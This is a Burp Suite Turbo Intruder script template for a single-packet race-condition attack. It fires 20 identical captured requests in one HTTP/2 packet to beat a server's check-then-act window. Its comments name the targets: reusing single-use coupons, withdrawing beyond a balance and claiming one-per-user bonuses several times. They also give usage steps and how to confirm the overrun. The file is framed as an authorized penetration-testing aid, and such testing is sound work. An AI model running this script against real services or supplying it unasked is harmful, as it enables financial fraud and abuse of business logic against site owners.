# race_single_packet.py — Turbo Intruder template: single-packet limit-overrun / double-spend.
#
# Runs INSIDE Burp's Turbo Intruder (Jython), not standalone. It queues N identical copies
# of the captured request behind a gate, then releases them in ONE HTTP/2 packet so they hit
# the server's race window together (TOCTOU). Use for: apply once-only coupon/credit N times,
# withdraw/transfer more than balance, claim one-per-user bonus N times.
#
# HOW TO USE:
#   1) Burp → capture the LIMITED action → right-click → "Send to turbo intruder".
#   2) Paste this script. Adjust REQUESTS (20–30 is plenty).
#   3) Attack. THEN re-read the invariant (balance/coupon/used count) to confirm the overrun —
#      the response status alone is NOT proof (guide §4/§16).
#
# Authorized testing only. Your own accounts/balances. Bounded bursts. Revert state. (guide §21)

REQUESTS = 20   # keep bounded; 20–30 streams in one packet is enough

def queueRequests(target, wordlists):
    # concurrentConnections=1 + Engine.BURP2 = one HTTP/2 connection, many parallel streams,
    # released as a single packet (the 2023 single-packet attack).
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Queue all requests behind a gate so none are sent until we open it.
    for i in range(REQUESTS):
        engine.queue(target.req, gate='race1')

    # Release every queued request together -> they arrive in the same window.
    engine.openGate('race1')


def handleResponse(req, interesting):
    # Collect every response; sort the table by status/length to spot anomalies.
    # The REAL confirmation is re-reading the invariant after the attack (do that manually):
    #   - balance went negative / credited N times
    #   - a single-use coupon shows used=true but was applied multiple times
    table.add(req)
